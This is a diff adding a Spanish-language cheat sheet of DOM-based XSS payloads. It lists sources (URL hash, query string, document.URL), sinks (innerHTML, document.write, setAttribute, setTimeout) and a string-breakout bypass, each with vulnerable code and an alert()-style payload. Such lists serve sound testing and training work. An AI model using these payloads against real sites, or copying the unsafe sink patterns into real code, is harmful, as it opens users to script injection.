@@ -1,0 +1,55 @@
+# =========================================================
+# PAYLOADS XSS BASADOS EN DOM (DOM-Based XSS Payloads)
+# =========================================================
+# Estos payloads explotan vulnerabilidades en el JavaScript del cliente, donde los datos 
+# controlados por el atacante se manipulan de forma insegura en el DOM.
+
+# 1. FUENTES COMUNES (Sources)
+# ----------------------------
+# Son las ubicaciones donde el script del cliente lee datos potencialmente maliciosos.
+
+# 1.1 Inyección a través del Fragmento (Hash) de la URL
+# La porción del hash (#...) de la URL no se envía al servidor, lo que la hace ideal para DOM XSS.
+# Ejemplo de código vulnerable: document.getElementById('output').innerHTML = location.hash.substring(1);
+# PAYLOAD: #<img src=x onerror=alert(1)>
+
+# 1.2 Inyección a través de la URL de búsqueda (Query String)
+# Ejemplo de código vulnerable: document.write('Bienvenido, ' + location.search.substring(1));
+# Si la URL es: ?name=
+# PAYLOAD: ?name=<svg onload=alert(1)>
+
+# 1.3 Inyección a través de document.URL o location.href
+# Incluye toda la URL.
+# PAYLOAD: '><svg onload=alert(1)>
+
+# 2. SUMIDEROS COMUNES (Sinks)
+# ----------------------------
+# Son las funciones o propiedades de JavaScript que ejecutan o renderizan el código inyectado.
+
+# 2.1 Uso de innerHTML o outerHTML
+# Permite inyectar etiquetas HTML completas.
+# Ejemplo: target.innerHTML = data;
+# PAYLOAD: <img src=x onerror=alert(1)>
+
+# 2.2 Uso de document.write() o document.writeln()
+# Permite escribir directamente en el documento.
+# Ejemplo: document.write(data);
+# PAYLOAD: <script>alert('DOM XSS')</script>
+
+# 2.3 Uso de setAttribute() (Inseguro si no se usa correctamente)
+# Si el código vulnerable es: element.setAttribute('src', data);
+# Se puede cambiar a un evento:
+# PAYLOAD: x' onerror='alert(1)
+
+# 2.4 Uso de setTimeout, setInterval o funciones de ejecución de código
+# Si el código vulnerable es: setTimeout(data);
+# PAYLOAD: alert(document.domain)
+
+# 3. BYPASSES ESPECÍFICOS DE DOM
+# ------------------------------
+
+# 3.1 Cierre de un String en JavaScript
+# Contexto: var data = "..." + [INPUT] + "...";
+# Payload: "; alert(1)//
+# Resultado: var data = "..."; alert(1)//"..."
+# La comilla inicial (") cierra el string, el punto y coma (;) separa la sentencia, y el // comenta el resto.
